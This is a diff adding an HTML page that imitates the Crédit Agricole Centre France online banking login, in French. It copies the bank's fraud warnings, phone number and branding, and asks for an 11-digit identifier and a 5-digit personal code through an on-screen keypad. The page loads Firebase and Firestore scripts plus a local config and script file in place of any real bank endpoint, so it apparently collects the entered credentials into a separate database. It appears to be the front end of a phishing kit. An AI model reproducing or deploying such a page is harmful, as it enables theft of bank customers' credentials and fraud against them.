@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Accéder à mes comptes</title>
+    <link rel="stylesheet" href="styless.css">
+</head>
+<body>
+    <header class="header">
+        <button class="btn-icon" aria-label="Accueil">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="m3 9 9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z" />
+                <polyline points="9 22 9 12 15 12 15 22" />
+            </svg>
+        </button>
+        <div class="logo">
+            <img src="logo.png" alt="" width="150" height="90">
+        </div>
+        <button class="btn-icon" aria-label="Fermer">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <line x1="18" y1="6" x2="6" y2="18"></line>
+                <line x1="6" y1="6" x2="18" y2="18"></line>
+            </svg>
+        </button>
+    </header>
+
+    <main class="main-content">
+        <div class="security-banner">
+            <h2>
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                </svg>
+                SÉCURISEZ VOTRE MOT DE PASSE
+            </h2>
+            <ul>
+                <li>Changez-le régulièrement</li>
+                <li>Évitez vos informations personnelles<br><small>date de naissance, numéro de téléphone...</small></li>
+            </ul>
+            <button class="btn-primary">JE REGARDE LE TUTO POUR CHANGER MON CODE !</button>
+        </div>
+        <div class="content-wrapper">
+            <div class="form-container">
+                <h1>Accéder à mes comptes</h1>
+                <form id="loginForm">
+                    <div id="step1">
+                        <div class="form-group">
+                            <label for="identifier">IDENTIFIANT</label>
+                            <p class="form-hint">Saisissez votre identifiant à 11 chiffres</p>
+                            <div class="input-wrapper">
+                                <input type="text" id="identifierStep1" name="identifier" placeholder="Exemple 98652706859" maxlength="11">
+                                <button type="button" class="clear-button" id="clearIdentifier">&times;</button>
+                            </div>
+                        </div>
+                        <button type="button" class="btn-primary" id="nextStep">ENTRER MON CODE PERSONNEL</button>
+                    </div>
+
+                    <div id="step2" style="display: none;">
+                        <div class="form-group">
+                            <label for="identifierStep2">IDENTIFIANT</label>
+                            <p class="form-hint">Saisissez votre identifiant à 11 chiffres</p>
+                            <input type="text" id="identifierStep2" name="identifier" readonly>
+
+                            <label for="code">CODE PERSONNEL</label>
+                            <div class="input-wrapper">
+                                <input type="password" id="code" name="code" readonly maxlength="5">
+                                <button type="button" class="clear-button" id="clearCode">&times;</button>
+                            </div>
+                            <div class="numeric-keypad">
+                                <button type="button" class="numeric-key" data-value="1">1</button>
+                                <button type="button" class="numeric-key" data-value="2">2</button>
+                                <button type="button" class="numeric-key" data-value="3">3</button>
+                                <button type="button" class="numeric-key" data-value="4">4</button>
+                                <button type="button" class="numeric-key" data-value="5">5</button>
+                                <button type="button" class="numeric-key" data-value="6">6</button>
+                                <button type="button" class="numeric-key" data-value="7">7</button>
+                                <button type="button" class="numeric-key" data-value="8">8</button>
+                                <button type="button" class="numeric-key" data-value="9">9</button>
+                                <button type="button" class="numeric-key" data-value="0">0</button>
+                            </div>
+                        </div>
+                        <button class="btn-primary" id="submitBtn" disabled>VALIDER</button>
+                    </div>
+                </form>
+
+                <div class="become-client">
+                    <p>Vous n'êtes pas encore client ?</p>
+                    <button class="btn-outline">DEVENIR CLIENT</button>
+                </div>
+            </div>
+
+            <div class="info-container">
+                <a href="#" class="english-button">
+                    <img src="uk-flag.jpeg" alt="English" width="24" height="24">
+                    English speaking customer
+                </a>
+
+                <div class="alert-box">
+                    <h3>
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path>
+                            <line x1="12" y1="9" x2="12" y2="13"></line>
+                            <line x1="12" y1="17" x2="12.01" y2="17"></line>
+                        </svg>
+                        ALERTE FRAUDE
+                    </h3>
+                    <p>Un conseiller ne vous demandera jamais vos données bancaires (identifiant, mot de passe, code reçu, numéro de carte bancaire) par téléphone, mail ou SMS,Cela se fait uniquement sur nos sites.</p>
+                    <p>Ne communiquez jamais ces informations à quiconque, même pour soi-disant confirmer ou annuler une opération.</p>
+                    <a href="#" class="link">+ Plus d'infos</a>
+                </div>
+
+                <section class="help-section">
+                    <h2>OUBLI/PERTE DE CODE PERSONNEL</h2>
+                    <p>Si vous avez oublié ou perdu votre code personnel, cliquez <a href="#" class="link">ici</a>.</p>
+                </section>
+
+                <section class="help-section">
+                    <h2>ASSISTANCE TECHNIQUE</h2>
+                    <p>Vous rencontrez une difficulté sur notre site ou sur nos applications mobiles :</p>
+                    <a href="#" class="tutorial-button">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <circle cx="12" cy="12" r="10" />
+                            <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3" />
+                            <line x1="12" y1="17" x2="12.01" y2="17" />
+                        </svg>
+                        Accéder à nos tutoriels
+                    </a>
+
+                    <div class="contact-info">
+                        <p>Vous pouvez également nous contacter par téléphone au</p>
+                        <p class="phone-number">04 73 74 40 80</p>
+                        <p>(8h30-19h du lundi au vendredi, 8h30-17h le samedi, prix d'un appel local)</p>
+                        <p>Uniquement si vous êtes client(e) du Crédit Agricole Centre France (Allier, Cantal, Corrèze, Creuse, Puy-de-Dôme) sinon merci de vous rendre sur le site de la Caisse régionale qui gère votre compte.</p>
+                    </div>
+                </section>
+
+                <section class="security-section">
+                    <h2>SÉCURITÉ</h2>
+                    <p>Facilitez et sécurisez vos opérations en ligne avec Sécuripass : <a href="#" class="link">en savoir plus</a>.</p>
+                    <p>Restez vigilants et veillez à protéger vos données personnelles.</p>
+                    <p><a href="#" class="link">Consultez nos conseils de sécurité</a></p>
+                </section>
+            </div>
+        </div>
+    </main>
+   
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>
+    <script src="firebase-config.js"></script>
+    <script src="script1.js"></script>
+</body>
+</html>
